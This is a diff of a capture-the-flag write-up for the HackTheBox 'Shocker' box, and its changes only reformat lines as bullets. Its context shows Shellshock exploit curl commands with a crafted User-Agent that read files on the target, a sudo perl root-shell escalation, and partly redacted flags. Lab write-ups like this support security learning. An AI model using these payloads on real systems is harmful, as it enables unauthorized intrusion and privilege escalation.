@@ -55,7 +55,7 @@ curl http://10.10.10.56/cgi-bin/user.sh -A "() { :;}; echo 'Content-Type: text/p
 user.sh
 ```
 
-Lets get the user of the box in /home
+- Lets get the user of the box in /home
 
 ```
 curl http://10.10.10.56/cgi-bin/user.sh -A "() { :;}; echo 'Content-Type: text/plain';echo; /bin/ls /home"
@@ -70,7 +70,7 @@ We can get the user flag now then work on getting on the box properly via a reve
 curl -v http://10.10.10.56/cgi-bin/user.sh -A "() { :;}; echo 'Content-Type: text/plain';echo; /bin/cat /home/shelly/user.txt"
 ```
 
-Flag
+- Flag
 ```
 beb558c0c6{REDACTED}a1ce663157
 ```
@@ -88,7 +88,7 @@ export TERM=xterm
 export SHELL=bash
 ```
 
-Looking around the system you quickly find sudo -l has a good esculation route
+- Looking around the system you quickly find sudo -l has a good esculation route
 
 ```
 Matching Defaults entries for shelly on Shocker:
@@ -101,7 +101,8 @@ User shelly may run the following commands on Shocker:
 
 ## Root
 
-GTFOBins 
+- GTFOBins  
+
 ![image](https://user-images.githubusercontent.com/5285547/124326697-c4db4a00-db7e-11eb-9ce2-0f01ae33dc46.png)
 
 
@@ -109,12 +110,12 @@ GTFOBins
 sudo perl -e 'exec "/bin/sh";'
 ```
 
-Now we are root and can get the last flag.txt in /root
+- Now we are root and can get the last flag.txt in /root
 
 ![image](https://user-images.githubusercontent.com/5285547/124326767-eccaad80-db7e-11eb-8b39-0bd25d522af8.png)
 
 
-Flag
+- Flag
 ```
 f011efb96{REDACTED}a7f7284ceea
 ```
